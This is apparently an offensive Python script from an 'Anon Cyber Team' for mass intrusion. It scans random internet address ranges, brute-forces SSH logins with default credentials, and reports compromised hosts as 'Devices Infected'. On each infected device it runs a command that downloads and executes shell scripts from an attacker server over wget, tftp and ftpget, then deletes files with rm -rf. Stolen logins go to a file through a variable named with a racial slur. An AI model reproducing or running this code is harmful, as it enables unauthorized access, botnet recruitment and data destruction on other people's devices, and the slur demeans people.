#!/usr/bin/env python
#**********************************
# Bruteforcing Vulnerable Devices #
#    By 4WSec - Anon Cyber Team   #
#*********************************

###############################
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
M = '\033[1;35;32m' # magenta
###############################


# RANGES , 119.93, 122.3, 122.52, 101.109, 180.180, 125.27, 101.109
import threading, paramiko, random, socket, time, sys

print ''
print color.RED + '[ Please, Input Ur IP Into Line 177 !!! ]'
print color.END + '------------------------------------------------------------------------------------------------'
usage='Usage: python gaza.py [threads] [A|B|C|LUCKY|LUCKY2|FAST] [IPRANGE] [admin|vps|rooty|silent|saw|perl]'
if len(sys.argv) < 4:
        sys.exit(usage)

paramiko.util.log_to_file("/dev/null")

blacklist = [
    '127','192.168'
]

passwords = [ 
  "telnet:telnet"
  "admin:admin",
  "root:root",
  "ubuntu:ubntu",
  "vagrant:vagrant",
  "admin123:admin123",
  "root123:root123",
  "vps1:vps1",
]

if sys.argv[4] == 'admin':
     passwords = ["root:root"]
if sys.argv[4] == 'vps':
     passwords = ["guest:guest"]
if sys.argv[4] == 'rooty':
     passwords = ["admin:admin"]
if sys.argv[4] == 'silent':
     passwords = ["telnet:telnet"]
if sys.argv[4] == 'saw':
	passwords = ["root:root", "admin:1234", "admin:admin", "lucky:lucky", "vps1:vps1"]
if sys.argv[4] == 'perl':
	passwords = ["root:admin"]

print color.DARKCYAN + "  ______ _______ ______ _______ "
print color.WARNING + " |  ____ |_____|  ____/ |_____| "
print color.DARKCYAN + " |_____| |     | /_____ |     | "
print ""
print color.OKGREEN + "--==[ Scanner SSH, Telnet by 4WSec "
print color.OKGREEN + "--==[ Anon Cyber Team "

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
                        lucky = ["91.99","91.98","5.74","113.53", "119.92", "223.179", "101.108", "125.24", "125.25", "125.26", "119.93"]
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "ANAL":
                        anal = ["125.27","101.109","113.53","118.173","122.170","122.180","46.62","5.78","101.108","1.20","125.25","125.26","182.52","118.172","118.174","118.175","125.24"]
                        self.host = random.choice(anal)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY2":
                        lucky2 = lucky2 = [ ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
		    elif ipclassinfo == "FAST":
                        lucky2 = [  ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))

                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print '\x1b[1;31mDevices Infected: ' +self.host+' username: '+username+' Pass: '+password+'|'+str(port)
            # INPUT YOUR IP INTO LINE 194, change this: [ YOUR-IP]            
			ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://YOUR-IP/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp YOUR-IP -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g YOUR-IP; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P YOUR-IP ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
			nigger = open("anal.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
                        time.sleep(0.5)
                        ssh.close()
            except:
                pass

for x in range(0,1500):
    try:
        t = sshscanner()
        t.start()
    except:
        pass
